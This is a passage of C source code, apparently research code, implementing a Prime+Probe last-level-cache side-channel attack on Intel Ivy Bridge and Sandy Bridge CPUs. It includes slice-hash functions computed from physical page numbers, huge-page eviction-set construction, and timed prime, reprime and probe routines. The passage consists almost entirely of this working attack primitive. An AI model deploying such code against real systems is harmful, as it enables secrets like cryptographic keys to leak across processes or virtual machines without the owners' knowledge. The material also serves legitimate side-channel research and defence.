        E[(cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(E + (cache_slice_pattern[monline_cache_slice][2] << 17)/8 + cache_line_check_offset/8 + KB(32)/8);
        E[(cache_slice_pattern[monline_cache_slice][2] << 17)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(E + (cache_slice_pattern[monline_cache_slice][3] << 17)/8 + cache_line_check_offset/8 + KB(32)/8);
        E[(cache_slice_pattern[monline_cache_slice][3] << 17)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(B + (cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8 + KB(32)/8);


        init_reprime = B + (cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8 + KB(32)/8;
    } else {
        B[(cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(B + (cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8 - KB(32)/8);
        B[(cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(B + (cache_slice_pattern[monline_cache_slice][2] << 17)/8 + cache_line_check_offset/8 - KB(32)/8);
        B[(cache_slice_pattern[monline_cache_slice][2] << 17)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(B + (cache_slice_pattern[monline_cache_slice][3] << 17)/8 + cache_line_check_offset/8 - KB(32)/8);
        B[(cache_slice_pattern[monline_cache_slice][3] << 17)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(C + (cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8 - KB(32)/8);

        C[(cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(C + (cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8 - KB(32)/8);
        C[(cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(C + (cache_slice_pattern[monline_cache_slice][2] << 17)/8 + cache_line_check_offset/8 - KB(32)/8);
        C[(cache_slice_pattern[monline_cache_slice][2] << 17)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(C + (cache_slice_pattern[monline_cache_slice][3] << 17)/8 + cache_line_check_offset/8 - KB(32)/8);
        C[(cache_slice_pattern[monline_cache_slice][3] << 17)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(D + (cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8 - KB(32)/8);

        D[(cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(D + (cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8 - KB(32)/8);
        D[(cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(D + (cache_slice_pattern[monline_cache_slice][2] << 17)/8 + cache_line_check_offset/8 - KB(32)/8);
        D[(cache_slice_pattern[monline_cache_slice][2] << 17)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(D + (cache_slice_pattern[monline_cache_slice][3] << 17)/8 + cache_line_check_offset/8 - KB(32)/8);
        D[(cache_slice_pattern[monline_cache_slice][3] << 17)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(E + (cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8 - KB(32)/8);

        E[(cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(E + (cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8 - KB(32)/8);
        E[(cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(E + (cache_slice_pattern[monline_cache_slice][2] << 17)/8 + cache_line_check_offset/8 - KB(32)/8);
        E[(cache_slice_pattern[monline_cache_slice][2] << 17)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(E + (cache_slice_pattern[monline_cache_slice][3] << 17)/8 + cache_line_check_offset/8 - KB(32)/8);
        E[(cache_slice_pattern[monline_cache_slice][3] << 17)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(B + (cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8 - KB(32)/8);

        init_reprime = B + (cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8 - KB(32)/8;
    }


    init_prime = B + (cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8;
    

    return 1;
}

void ivybridge_i7_3770_prime() {
    //printf("ivybridge_i7_3770_prime\n");
    TIMESTAMP_START;
    TIMESTAMP_STOP;
    TIMESTAMP_START;
    TIMESTAMP_STOP;
    volatile char **tmp1 = init_prime;
    //printf("%d : ", ivybridge_i7_3770_cache_slice_from_virt((void*)tmp1));
    //printPtr2bin((void*)(get_pfn((void*)tmp1) << 12));
    //printPtr2bin((void*)tmp1);
    tmp1 = (volatile char **)*tmp1;
    //printf("%d : ", ivybridge_i7_3770_cache_slice_from_virt((void*)tmp1));
    //printPtr2bin((void*)(get_pfn((void*)tmp1) << 12));
    //printPtr2bin((void*)tmp1);
    tmp1 = (volatile char **)*tmp1;
    //printf("%d : ", ivybridge_i7_3770_cache_slice_from_virt((void*)tmp1));
    //printPtr2bin((void*)(get_pfn((void*)tmp1) << 12));
    //printPtr2bin((void*)tmp1);
    tmp1 = (volatile char **)*tmp1;
    //printf("%d : ", ivybridge_i7_3770_cache_slice_from_virt((void*)tmp1));
    //printPtr2bin((void*)(get_pfn((void*)tmp1) << 12));
    //printPtr2bin((void*)tmp1);
    tmp1 = (volatile char **)*tmp1;
    //printf("%d : ", ivybridge_i7_3770_cache_slice_from_virt((void*)tmp1));
    //printPtr2bin((void*)(get_pfn((void*)tmp1) << 12));
    //printPtr2bin((void*)tmp1);
    tmp1 = (volatile char **)*tmp1;
    //printf("%d : ", ivybridge_i7_3770_cache_slice_from_virt((void*)tmp1));
    //printPtr2bin((void*)(get_pfn((void*)tmp1) << 12));
    //printPtr2bin((void*)tmp1);
    tmp1 = (volatile char **)*tmp1;
    //printf("%d : ", ivybridge_i7_3770_cache_slice_from_virt((void*)tmp1));
    //printPtr2bin((void*)(get_pfn((void*)tmp1) << 12));
    //printPtr2bin((void*)tmp1);
    tmp1 = (volatile char **)*tmp1;
    //printf("%d : ", ivybridge_i7_3770_cache_slice_from_virt((void*)tmp1));
    //printPtr2bin((void*)(get_pfn((void*)tmp1) << 12));
    //printPtr2bin((void*)tmp1);
    tmp1 = (volatile char **)*tmp1;
    //printf("%d : ", ivybridge_i7_3770_cache_slice_from_virt((void*)tmp1));
    //printPtr2bin((void*)(get_pfn((void*)tmp1) << 12));
    //printPtr2bin((void*)tmp1);
    tmp1 = (volatile char **)*tmp1;
    //printf("%d : ", ivybridge_i7_3770_cache_slice_from_virt((void*)tmp1));
    //printPtr2bin((void*)(get_pfn((void*)tmp1) << 12));
    //printPtr2bin((void*)tmp1);
    tmp1 = (volatile char **)*tmp1;
    //printf("%d : ", ivybridge_i7_3770_cache_slice_from_virt((void*)tmp1));
    //printPtr2bin((void*)(get_pfn((void*)tmp1) << 12));
    //printPtr2bin((void*)tmp1);
    tmp1 = (volatile char **)*tmp1;
    //printf("%d : ", ivybridge_i7_3770_cache_slice_from_virt((void*)tmp1));
    //printPtr2bin((void*)(get_pfn((void*)tmp1) << 12));
    //printPtr2bin((void*)tmp1);
    tmp1 = (volatile char **)*tmp1;
    //printf("%d : ", ivybridge_i7_3770_cache_slice_from_virt((void*)tmp1));
    //printPtr2bin((void*)(get_pfn((void*)tmp1) << 12));
    //printPtr2bin((void*)tmp1);
    tmp1 = (volatile char **)*tmp1;
    //printf("%d : ", ivybridge_i7_3770_cache_slice_from_virt((void*)tmp1));
    //printPtr2bin((void*)(get_pfn((void*)tmp1) << 12));
    //printPtr2bin((void*)tmp1);
    tmp1 = (volatile char **)*tmp1;
    //printf("%d : ", ivybridge_i7_3770_cache_slice_from_virt((void*)tmp1));
    //printPtr2bin((void*)(get_pfn((void*)tmp1) << 12));
    //printPtr2bin((void*)tmp1);
    tmp1 = (volatile char **)*tmp1;
    //printf("%d : ", ivybridge_i7_3770_cache_slice_from_virt((void*)tmp1));
    //printPtr2bin((void*)(get_pfn((void*)tmp1) << 12));
    //printPtr2bin((void*)tmp1);
    tmp1 = (volatile char **)*tmp1;
    //printf("%d : ", ivybridge_i7_3770_cache_slice_from_virt((void*)tmp1));
    //printPtr2bin((void*)(get_pfn((void*)tmp1) << 12));
    //printPtr2bin((void*)tmp1);
}

void ivybridge_i7_3770_reprime() {
    //printf("ivybridge_i7_3770_reprime\n");
    volatile char **tmp1 = init_reprime;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
}

unsigned long int ivybridge_i7_3770_probe() {
    //printf("ivybridge_i7_3770_probe\n");
    // PROBE & MEASURE
    unsigned long int begin, end;
    //unsigned long int begin2, end2;
    volatile char **tmp1 = init_prime;
    TIMESTAMP_START;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    TIMESTAMP_STOP;
    begin = get_global_timestamp_start();
    end = get_global_timestamp_stop();
/*
    TIMESTAMP_START;
    TIMESTAMP_STOP;
    begin2 = get_global_timestamp_start();
    end2 = get_global_timestamp_stop();
*/
    return (end-begin);//-(end2-begin2);
}



// Sandy Bridge

int sandybridge_i5_2435m_cache_slice_from_virt(void* addr) {
    unsigned long int x = ((unsigned long int*)addr)[0];
    return sandybridge_i5_2435m_cache_slice_alg((void*)(get_pfn(addr) << 12));
}

int sandybridge_i5_2435m_cache_slice_alg(void* addr) {
    //printf("sandybridge_i5_2435m_cache_slice\n");
    //unsigned long int x = ((unsigned long int*)addr)[0];
    //unsigned long int i_addr = (unsigned long int) get_pfn(addr);
    
    //printf("\n%016p : \n", (void *) addr);

    unsigned long int i_addr = (unsigned long int) addr;

/*
    printf("vvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvv\n");
    printPtr2bin((void *) addr);
    printf("17:%lu 18:%lu 20:%lu 22:%lu 24:%lu 25:%lu 26:%lu 27:%lu 28:%lu 30:%lu\n", ((i_addr & 0x000020000) >> 17), ((i_addr & 0x000040000) >> 18), 
                ((i_addr & 0x000100000) >> 20), ((i_addr & 0x000400000) >> 22), ((i_addr & 0x001000000) >> 24), ((i_addr & 0x002000000) >> 25),
                ((i_addr & 0x004000000) >> 26), ((i_addr & 0x008000000) >> 27), ((i_addr & 0x010000000) >> 28), ((i_addr & 0x040000000) >> 30));
    printf("^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n");
*/

    // According to lackingrhoticity.blogspot.dk/2015/04/l3-cache-mapping-on-sandy-bridge-cpus.html
    // Intel Core i5 2435M (2 core)
    int bit0 = ((i_addr & 0x000020000) >> 17) ^ ((i_addr & 0x000040000) >> 18) ^ ((i_addr & 0x000100000) >> 20) ^ ((i_addr & 0x000400000) >> 22) 
             ^ ((i_addr & 0x001000000) >> 24) ^ ((i_addr & 0x002000000) >> 25) ^ ((i_addr & 0x004000000) >> 26) ^ ((i_addr & 0x008000000) >> 27) 
             ^ ((i_addr & 0x010000000) >> 28) ^ ((i_addr & 0x040000000) >> 30); // ^ ((i_addr & 0x100000000) >> 32) ^ ((i_addr & 0x200000000) >> 33);


    return bit0;
}


// Ivy Bridge i7-3770 FUNCTIONS
    
int sandybridge_i5_2435m_setup(unsigned long int monline) {
    //printf("sandybridge_i5_2435m_setup\n");
    unsigned long int cache_line_check_offset = monline & 0x00001FFFF;  // 0001 1111 1111 1111 1111
    //printPtr2bin((void *)cache_line_check_offset);
    size_t mem_length = (size_t)MB(2); 
    unsigned long int x = 0;
    int i = 0;
    //int mem_length_char = ((int)mem_length/sizeof(char));
    //int mem_length_ptr = (int)mem_length/sizeof(void *);

    int monline_cache_slice = sandybridge_i5_2435m_cache_slice_alg((void *) monline);
    //printf("monline_cache_slice\t:\t%d\n", monline_cache_slice);

    void *tmp[128];
    int B_idx = -1;
    int C_idx = -1;

    int cache_slice_pattern[2][8];

    cache_slice_pattern[0][0] = 0x0;
    cache_slice_pattern[0][1] = 0xa;
    cache_slice_pattern[0][2] = 0x9;
    cache_slice_pattern[0][3] = 0x3;
    cache_slice_pattern[0][4] = 0x4;
    cache_slice_pattern[0][5] = 0xe;
    cache_slice_pattern[0][6] = 0xd;
    cache_slice_pattern[0][7] = 0x7;

    cache_slice_pattern[1][0] = 0x8;
    cache_slice_pattern[1][1] = 0x2;
    cache_slice_pattern[1][2] = 0x1;
    cache_slice_pattern[1][3] = 0xb;
    cache_slice_pattern[1][4] = 0xc;
    cache_slice_pattern[1][5] = 0x6;
    cache_slice_pattern[1][6] = 0x5;
    cache_slice_pattern[1][7] = 0xf;


    for (i = 0; i < 128; ++i) tmp[i] = NULL;

    for (i = 0; i < 128; ++i) {
        tmp[i] = mmap(NULL, mem_length, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_HUGETLB, -1, 0);
        //printf("sandybridge_i5_2435m_cache_slice_from_virt(tmp[i])\t:\t%d\n", sandybridge_i5_2435m_cache_slice_from_virt(tmp[i]));
        //x += (unsigned long int)(*((unsigned int)tmp[i]));
        if (sandybridge_i5_2435m_cache_slice_from_virt(tmp[i]) == 0) {     //monline_cache_slice
            if (B_idx == -1) {
                B = tmp[i];
                B_idx = i;
                continue;
            }
            if (C_idx == -1) {
                C = tmp[i];
                C_idx = i;
                break;
            }
        }
    }
    
    //printf("B_idx\t:\t%d\n", B_idx);
    //printf("C_idx\t:\t%d\n", C_idx);

    if (B_idx == -1 || C_idx == -1) return 0;

    // THIS FOR LOOP NEEDS REVISION (is munmap((void *) addr, size_t length) relieasing the hugepage as expected?)
    for (i = 0; i < 128; ++i) {
        //printf("i\t:\t%d\n", i);
        if (i != B_idx && i != C_idx && tmp[i] != NULL) {
            munmap(tmp[i], MB(2));
        }
    }

    printf("%p\n", B);
    printf("%p\n", C);


    //B = mmap(NULL, mem_length, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_HUGETLB, -1, 0);
    //C = mmap(NULL, mem_length, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_HUGETLB, -1, 0);

    // check if memory was properly allocated

    x += (unsigned long int)B[MB(0)];
    x += (unsigned long int)C[MB(0)];
    //x += (unsigned long int)D[MB(0)];
    //x += (unsigned long int)E[MB(0)];

    //printf("B : %p\n", (void *)get_pfn(B));
    //printf("C : %p\n", (void *)get_pfn(C));


    B[(cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8] = (volatile char *)(B + (cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8);
    B[(cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8] = (volatile char *)(B + (cache_slice_pattern[monline_cache_slice][2] << 17)/8 + cache_line_check_offset/8);
    B[(cache_slice_pattern[monline_cache_slice][2] << 17)/8 + cache_line_check_offset/8] = (volatile char *)(B + (cache_slice_pattern[monline_cache_slice][3] << 17)/8 + cache_line_check_offset/8);
    B[(cache_slice_pattern[monline_cache_slice][3] << 17)/8 + cache_line_check_offset/8] = (volatile char *)(B + (cache_slice_pattern[monline_cache_slice][4] << 17)/8 + cache_line_check_offset/8);
    B[(cache_slice_pattern[monline_cache_slice][4] << 17)/8 + cache_line_check_offset/8] = (volatile char *)(B + (cache_slice_pattern[monline_cache_slice][5] << 17)/8 + cache_line_check_offset/8);
    B[(cache_slice_pattern[monline_cache_slice][5] << 17)/8 + cache_line_check_offset/8] = (volatile char *)(B + (cache_slice_pattern[monline_cache_slice][6] << 17)/8 + cache_line_check_offset/8);
    B[(cache_slice_pattern[monline_cache_slice][6] << 17)/8 + cache_line_check_offset/8] = (volatile char *)(B + (cache_slice_pattern[monline_cache_slice][7] << 17)/8 + cache_line_check_offset/8);
    B[(cache_slice_pattern[monline_cache_slice][7] << 17)/8 + cache_line_check_offset/8] = (volatile char *)(C + (cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8);

    C[(cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8] = (volatile char *)(C + (cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8);
    C[(cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8] = (volatile char *)(C + (cache_slice_pattern[monline_cache_slice][2] << 17)/8 + cache_line_check_offset/8);
    C[(cache_slice_pattern[monline_cache_slice][2] << 17)/8 + cache_line_check_offset/8] = (volatile char *)(C + (cache_slice_pattern[monline_cache_slice][3] << 17)/8 + cache_line_check_offset/8);
    C[(cache_slice_pattern[monline_cache_slice][3] << 17)/8 + cache_line_check_offset/8] = (volatile char *)(C + (cache_slice_pattern[monline_cache_slice][4] << 17)/8 + cache_line_check_offset/8);
    C[(cache_slice_pattern[monline_cache_slice][4] << 17)/8 + cache_line_check_offset/8] = (volatile char *)(C + (cache_slice_pattern[monline_cache_slice][5] << 17)/8 + cache_line_check_offset/8);
    C[(cache_slice_pattern[monline_cache_slice][5] << 17)/8 + cache_line_check_offset/8] = (volatile char *)(C + (cache_slice_pattern[monline_cache_slice][6] << 17)/8 + cache_line_check_offset/8);
    C[(cache_slice_pattern[monline_cache_slice][6] << 17)/8 + cache_line_check_offset/8] = (volatile char *)(C + (cache_slice_pattern[monline_cache_slice][7] << 17)/8 + cache_line_check_offset/8);
    C[(cache_slice_pattern[monline_cache_slice][7] << 17)/8 + cache_line_check_offset/8] = (volatile char *)(B + (cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8);

    

    if ( ((cache_slice_pattern[monline_cache_slice][3] << 17) + cache_line_check_offset + KB(32)) < MB(2) ) {
        B[(cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(B + (cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8 + KB(32)/8);
        B[(cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(B + (cache_slice_pattern[monline_cache_slice][2] << 17)/8 + cache_line_check_offset/8 + KB(32)/8);
        B[(cache_slice_pattern[monline_cache_slice][2] << 17)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(B + (cache_slice_pattern[monline_cache_slice][3] << 17)/8 + cache_line_check_offset/8 + KB(32)/8);
        B[(cache_slice_pattern[monline_cache_slice][3] << 17)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(B + (cache_slice_pattern[monline_cache_slice][4] << 17)/8 + cache_line_check_offset/8 + KB(32)/8);
        B[(cache_slice_pattern[monline_cache_slice][4] << 17)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(B + (cache_slice_pattern[monline_cache_slice][5] << 17)/8 + cache_line_check_offset/8 + KB(32)/8);
        B[(cache_slice_pattern[monline_cache_slice][5] << 17)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(B + (cache_slice_pattern[monline_cache_slice][6] << 17)/8 + cache_line_check_offset/8 + KB(32)/8);
        B[(cache_slice_pattern[monline_cache_slice][6] << 17)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(B + (cache_slice_pattern[monline_cache_slice][7] << 17)/8 + cache_line_check_offset/8 + KB(32)/8);
        B[(cache_slice_pattern[monline_cache_slice][7] << 17)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(C + (cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8 + KB(32)/8);

        C[(cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(C + (cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8 + KB(32)/8);
        C[(cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(C + (cache_slice_pattern[monline_cache_slice][2] << 17)/8 + cache_line_check_offset/8 + KB(32)/8);
        C[(cache_slice_pattern[monline_cache_slice][2] << 17)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(C + (cache_slice_pattern[monline_cache_slice][3] << 17)/8 + cache_line_check_offset/8 + KB(32)/8);
        C[(cache_slice_pattern[monline_cache_slice][3] << 17)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(C + (cache_slice_pattern[monline_cache_slice][4] << 17)/8 + cache_line_check_offset/8 + KB(32)/8);
        C[(cache_slice_pattern[monline_cache_slice][4] << 17)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(C + (cache_slice_pattern[monline_cache_slice][5] << 17)/8 + cache_line_check_offset/8 + KB(32)/8);
        C[(cache_slice_pattern[monline_cache_slice][5] << 17)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(C + (cache_slice_pattern[monline_cache_slice][6] << 17)/8 + cache_line_check_offset/8 + KB(32)/8);
        C[(cache_slice_pattern[monline_cache_slice][6] << 17)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(C + (cache_slice_pattern[monline_cache_slice][7] << 17)/8 + cache_line_check_offset/8 + KB(32)/8);
        C[(cache_slice_pattern[monline_cache_slice][7] << 17)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(B + (cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8 + KB(32)/8);

        

        init_reprime = B + (cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8 + KB(32)/8;
    } else {
        B[(cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(B + (cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8 - KB(32)/8);
        B[(cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(B + (cache_slice_pattern[monline_cache_slice][2] << 17)/8 + cache_line_check_offset/8 - KB(32)/8);
        B[(cache_slice_pattern[monline_cache_slice][2] << 17)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(B + (cache_slice_pattern[monline_cache_slice][3] << 17)/8 + cache_line_check_offset/8 - KB(32)/8);
        B[(cache_slice_pattern[monline_cache_slice][3] << 17)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(B + (cache_slice_pattern[monline_cache_slice][4] << 17)/8 + cache_line_check_offset/8 - KB(32)/8);
        B[(cache_slice_pattern[monline_cache_slice][4] << 17)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(B + (cache_slice_pattern[monline_cache_slice][5] << 17)/8 + cache_line_check_offset/8 - KB(32)/8);
        B[(cache_slice_pattern[monline_cache_slice][5] << 17)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(B + (cache_slice_pattern[monline_cache_slice][6] << 17)/8 + cache_line_check_offset/8 - KB(32)/8);
        B[(cache_slice_pattern[monline_cache_slice][6] << 17)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(B + (cache_slice_pattern[monline_cache_slice][7] << 17)/8 + cache_line_check_offset/8 - KB(32)/8);
        B[(cache_slice_pattern[monline_cache_slice][7] << 17)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(C + (cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8 - KB(32)/8);

        C[(cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(C + (cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8 - KB(32)/8);
        C[(cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(C + (cache_slice_pattern[monline_cache_slice][2] << 17)/8 + cache_line_check_offset/8 - KB(32)/8);
        C[(cache_slice_pattern[monline_cache_slice][2] << 17)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(C + (cache_slice_pattern[monline_cache_slice][3] << 17)/8 + cache_line_check_offset/8 - KB(32)/8);
        C[(cache_slice_pattern[monline_cache_slice][3] << 17)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(C + (cache_slice_pattern[monline_cache_slice][4] << 17)/8 + cache_line_check_offset/8 - KB(32)/8);
        C[(cache_slice_pattern[monline_cache_slice][4] << 17)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(C + (cache_slice_pattern[monline_cache_slice][5] << 17)/8 + cache_line_check_offset/8 - KB(32)/8);
        C[(cache_slice_pattern[monline_cache_slice][5] << 17)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(C + (cache_slice_pattern[monline_cache_slice][6] << 17)/8 + cache_line_check_offset/8 - KB(32)/8);
        C[(cache_slice_pattern[monline_cache_slice][6] << 17)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(C + (cache_slice_pattern[monline_cache_slice][7] << 17)/8 + cache_line_check_offset/8 - KB(32)/8);
        C[(cache_slice_pattern[monline_cache_slice][7] << 17)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(B + (cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8 - KB(32)/8);

        
        init_reprime = B + (cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8 - KB(32)/8;
    }


    init_prime = B + (cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8;
    

    return 1;
}

void sandybridge_i5_2435m_prime() {
    //printf("sandybridge_i5_2435m_prime\n");
    TIMESTAMP_START;
    TIMESTAMP_STOP;
    TIMESTAMP_START;
    TIMESTAMP_STOP;
    volatile char **tmp1 = init_prime;
    //printf("%d : ", sandybridge_i5_2435m_cache_slice_from_virt((void*)tmp1));
    //printPtr2bin((void*)(get_pfn((void*)tmp1) << 12));
    //printPtr2bin((void*)tmp1);
    tmp1 = (volatile char **)*tmp1;
    //printf("%d : ", sandybridge_i5_2435m_cache_slice_from_virt((void*)tmp1));
    //printPtr2bin((void*)(get_pfn((void*)tmp1) << 12));
    //printPtr2bin((void*)tmp1);
    tmp1 = (volatile char **)*tmp1;
    //printf("%d : ", sandybridge_i5_2435m_cache_slice_from_virt((void*)tmp1));
    //printPtr2bin((void*)(get_pfn((void*)tmp1) << 12));
    //printPtr2bin((void*)tmp1);
    tmp1 = (volatile char **)*tmp1;
    //printf("%d : ", sandybridge_i5_2435m_cache_slice_from_virt((void*)tmp1));
    //printPtr2bin((void*)(get_pfn((void*)tmp1) << 12));
    //printPtr2bin((void*)tmp1);
    tmp1 = (volatile char **)*tmp1;
    //printf("%d : ", sandybridge_i5_2435m_cache_slice_from_virt((void*)tmp1));
    //printPtr2bin((void*)(get_pfn((void*)tmp1) << 12));
    //printPtr2bin((void*)tmp1);
    tmp1 = (volatile char **)*tmp1;
    //printf("%d : ", sandybridge_i5_2435m_cache_slice_from_virt((void*)tmp1));
    //printPtr2bin((void*)(get_pfn((void*)tmp1) << 12));
    //printPtr2bin((void*)tmp1);
    tmp1 = (volatile char **)*tmp1;
    //printf("%d : ", sandybridge_i5_2435m_cache_slice_from_virt((void*)tmp1));
    //printPtr2bin((void*)(get_pfn((void*)tmp1) << 12));
    //printPtr2bin((void*)tmp1);
    tmp1 = (volatile char **)*tmp1;
    //printf("%d : ", sandybridge_i5_2435m_cache_slice_from_virt((void*)tmp1));
    //printPtr2bin((void*)(get_pfn((void*)tmp1) << 12));
    //printPtr2bin((void*)tmp1);
    tmp1 = (volatile char **)*tmp1;
    //printf("%d : ", sandybridge_i5_2435m_cache_slice_from_virt((void*)tmp1));
    //printPtr2bin((void*)(get_pfn((void*)tmp1) << 12));
    //printPtr2bin((void*)tmp1);
    tmp1 = (volatile char **)*tmp1;
    //printf("%d : ", sandybridge_i5_2435m_cache_slice_from_virt((void*)tmp1));
